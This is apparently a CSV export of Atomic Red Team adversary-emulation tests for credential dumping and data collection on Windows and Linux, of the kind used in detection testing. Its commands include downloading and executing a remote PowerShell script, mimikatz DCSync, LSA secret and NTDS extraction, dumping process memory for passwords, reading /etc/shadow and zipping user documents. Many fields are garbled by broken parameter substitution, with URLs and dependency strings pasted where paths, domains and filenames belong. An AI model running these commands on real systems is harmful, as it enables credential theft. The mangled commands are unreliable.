"MITRE_ID","File","AtomicTest","ExecutorName","Command","Cleanup","Dependencies"
"T1003.003","C:\AtomicRedTeam\atomics\T1003.003\T1003.003.yaml","Copy NTDS in low level NTFS acquisition via fsutil","powershell","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR https://raw.githubusercontent.com/kfallahi/UnderlayCopy/37f2e9b76b724bc1211437b14deaf1e76b21791e/UnderlayCopy.ps1 -UseBasicParsing)
Underlay-Copy -Mode Metadata -SourceFile C:\Windows\NTDS\ntds.dit -DestinationFile C:\Windows\Temp\ntds.dit
Underlay-Copy -Mode Metadata -SourceFile C:\Windows\System32\config\SYSTEM -DestinationFile C:\Windows\Temp\SYSTEM_HIVE
","remove-item ""C:\Windows\Temp\ntds.dit"" -force -erroraction silentlycontinue
remove-item ""C:\Windows\Temp\SYSTEM_HIVE"" -force -erroraction silentlycontinue
",""
"T1003.004","C:\AtomicRedTeam\atomics\T1003.004\T1003.004.yaml","Dumping LSA Secrets","command_prompt","""https://download.sysinternals.com/files/PSTools.zip"" -accepteula -s reg save HKLM\security\policy\secrets %temp%\secrets /y
","del %temp%\secrets >nul 2> nul","Invoke-WebRequest ""https://download.sysinternals.com/files/PSTools.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\PSTools.zip"" Expand-Archive ""PathToAtomicsFolder\..\ExternalPayloads\PSTools.zip"" ""PathToAtomicsFolder\..\ExternalPayloads\PSTools"" -Force New-Item -ItemType Directory (Split-Path ""#{psexec_exe}"") -Force | Out-Null Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads\PSTools\PsExec.exe"" ""#{psexec_exe}"" -Force"
"T1003.006","C:\AtomicRedTeam\atomics\T1003.006\T1003.006.yaml","DCSync (Active Directory)","command_prompt","https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1 ""lsadump::dcsync /domain:https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1 /user:https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1@https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1"" ""exit""
",,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1"" -UseBasicParsing)  $releases = ""https://api.github.com/repos/gentilkiwi/mimikatz/releases"" $zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith("".zip"") } $mimikatz_exe = cmd /c echo #{mimikatz_path} $basePath = Split-Path $mimikatz_exe | Split-Path Invoke-FetchFromZip $zipUrl ""x64/mimikatz.exe"" $basePath "
"T1003.006","C:\AtomicRedTeam\atomics\T1003.006\T1003.006.yaml","Run DSInternals Get-ADReplAccount","powershell","Get-ADReplAccount -All -Server $ENV:logonserver.TrimStart(""\"")
",,"Install-Module -Name DSInternals -Scope CurrentUser -Force "
"T1003.007","C:\AtomicRedTeam\atomics\T1003.007\T1003.007.yaml","Dump individual process memory with sh (Local)","sh","sh sh -c 'echo \
PID=$(pgrep -n -f ""sh -c 'echo \"")
HEAP_MEM=$(grep -E ""^[0-9a-f-]* r"" /proc/""$PID""/maps | grep heap | cut -d' ' -f 1)
MEM_START=$(echo $((0x$(echo ""$HEAP_MEM"" | cut -d""-"" -f1))))
MEM_STOP=$(echo $((0x$(echo ""$HEAP_MEM"" | cut -d""-"" -f2))))
MEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))
dd if=/proc/""${PID}""/mem of=""sh -c 'echo \"" ibs=1 skip=""$MEM_START"" count=""$MEM_SIZE""
grep -i ""PASS"" ""sh -c 'echo \""
","rm -f ""sh -c 'echo \""
","echo '#!/bin/sh' > #{script_path} echo ""sh -c 'echo \""The password is #{pid_term}\"" && sleep 30' &"" >> #{script_path} "
"T1003.007","C:\AtomicRedTeam\atomics\T1003.007\T1003.007.yaml","Dump individual process memory with sh on FreeBSD (Local)","sh","sh sh -c 'echo \
PID=$(pgrep -n -f ""sh -c 'echo \"")
MEM_START=$(head -n 5 /proc/""${PID}""/map | tail -1 | cut -d' ' -f1)
MEM_STOP=$(head -n 5 /proc/""${PID}""/map | tail -1 | cut -d' ' -f2)
MEM_SIZE=$(echo $(($MEM_STOP-$MEM_START)))
dd if=/proc/""${PID}""/mem of=""sh -c 'echo \"" ibs=1 skip=""$MEM_START"" count=""$MEM_SIZE""
strings ""sh -c 'echo \"" | grep -i PASS
","rm -f ""sh -c 'echo \""
","echo '#!/bin/sh' > #{script_path} echo ""sh -c 'echo \""The password is #{pid_term}\"" && sleep 30' &"" >> #{script_path} "
"T1003.007","C:\AtomicRedTeam\atomics\T1003.007\T1003.007.yaml","Dump individual process memory with Python (Local)","sh","sh Python 2.7+ or 3.4+ must be installed
PID=$(pgrep -n -f ""Python 2.7+ or 3.4+ must be installed"")
PYTHON=$(which python || which python3 || which python2)
$PYTHON Python 2.7+ or 3.4+ must be installed $PID Python 2.7+ or 3.4+ must be installed
grep -i ""PASS"" ""Python 2.7+ or 3.4+ must be installed""
","rm -f ""Python 2.7+ or 3.4+ must be installed""
","echo '#!/bin/sh' > #{script_path} echo ""sh -c 'echo \""The password is #{pid_term}\"" && sleep 30' &"" >> #{script_path} ; echo ""Python 2.7+ or 3.4+ must be installed"" "
"T1003.007","C:\AtomicRedTeam\atomics\T1003.007\T1003.007.yaml","Capture Passwords with MimiPenguin","bash","sudo /tmp/mimipenguin.tar.gz > /tmp/mimipenguin.tar.gz
cat /tmp/mimipenguin.tar.gz
","rm -f /tmp/mimipenguin.tar.gz > /dev/null
","wget -O ""/tmp/mimipenguin.tar.gz"" https://github.com/huntergregal/mimipenguin/releases/download/2.0-release/mimipenguin_2.0-release.tar.gz mkdir /tmp/mimipenguin tar -xzvf ""/tmp/mimipenguin.tar.gz"" -C /tmp/mimipenguin ; sudo apt-get -y install binutils ; sudo apt-get -y install python2        ; sudo apt-get -y install libc-bin         "
"T1003.008","C:\AtomicRedTeam\atomics\T1003.008\T1003.008.yaml","Access /etc/shadow (Local)","bash","sudo cat /etc/shadow > /tmp/T1003.008.txt
cat /tmp/T1003.008.txt
","rm -f /tmp/T1003.008.txt
",""
"T1003.008","C:\AtomicRedTeam\atomics\T1003.008\T1003.008.yaml","Access /etc/master.passwd (Local)","sh","sudo cat /etc/master.passwd > /tmp/T1003.008.txt
cat /tmp/T1003.008.txt
","rm -f /tmp/T1003.008.txt
",""
"T1003.008","C:\AtomicRedTeam\atomics\T1003.008\T1003.008.yaml","Access /etc/passwd (Local)","sh","cat /etc/passwd > /tmp/T1003.008.txt
cat /tmp/T1003.008.txt
","rm -f /tmp/T1003.008.txt
",""
"T1003.008","C:\AtomicRedTeam\atomics\T1003.008\T1003.008.yaml","Access /etc/{shadow,passwd,master.passwd} with a standard bin that's not cat","sh","unamestr=$(uname)
if [ ""$unamestr"" = 'Linux' ]; then echo -e ""e /etc/passwd\n,p\ne /etc/shadow\n,p\n"" | ed > /tmp/T1003.008.txt; elif [ ""$unamestr"" = 'FreeBSD' ]; then echo -e ""e /etc/passwd\n,p\ne /etc/master.passwd\n,p\ne /etc/shadow\n,p\n"" | ed > /tmp/T1003.008.txt; fi
","rm -f /tmp/T1003.008.txt
",""
"T1003.008","C:\AtomicRedTeam\atomics\T1003.008\T1003.008.yaml","Access /etc/{shadow,passwd,master.passwd} with shell builtins","sh","testcat(){ (while read line; do echo $line >> /tmp/T1003.008.txt; done < $1) }
[ ""$(uname)"" = 'FreeBSD' ] && testcat /etc/master.passwd
testcat /etc/passwd
testcat /etc/shadow
","rm -f /tmp/T1003.008.txt
",""
"T1005","C:\AtomicRedTeam\atomics\T1005\T1005.yaml","Search files of interest and save them to a single zip file (Windows)","powershell","$startingDirectory = ""C:\Users""
$outputZip = ""PathToAtomicsFolder\..\ExternalPayloads\T1005""
$fileExtensionsString = "".doc, .docx, .txt"" 
$fileExtensions = $fileExtensionsString -split "", ""

New-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null

Function Search-Files {
  param (
    [string]$directory
  )
  $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {
    $fileExtensions -contains $_.Extension.ToLower()
  }
  return $files
}

$foundFiles = Search-Files -directory $startingDirectory
if ($foundFiles.Count -gt 0) {
  $foundFilePaths = $foundFiles.FullName
  Compress-Archive -Path $foundFilePaths -DestinationPath ""$outputZip\data.zip""

  Write-Host ""Zip file created: $outputZip\data.zip""
  } else {
      Write-Host ""No files found with the specified extensions.""
  }
","Remove-Item -Path  $outputZip\data.zip -Force
",""
"T1005","C:\AtomicRedTeam\atomics\T1005\T1005.yaml","Find and dump sqlite databases (Linux)","bash","cd $HOME
curl -O debian\|ubuntu\|kali\|mint/art
curl -O debian\|ubuntu\|kali\|mint/gta.db
curl -O debian\|ubuntu\|kali\|mint/sqlite_dump.sh
chmod +x sqlite_dump.sh
find . ! -executable -exec bash -c 'if [[ ""$(head -c 15 {} | strings)"" == ""SQLite format 3"" ]]; then echo ""{}""; ./sqlite_dump.sh {}; fi' \;
","rm -f $HOME/.art
rm -f $HOME/gta.db
rm -f $HOME/sqlite_dump.sh 
","if grep -iq ""debian\|ubuntu\|kali\|mint"" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi if grep -iq ""rhel\|fedora\|centos"" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi "
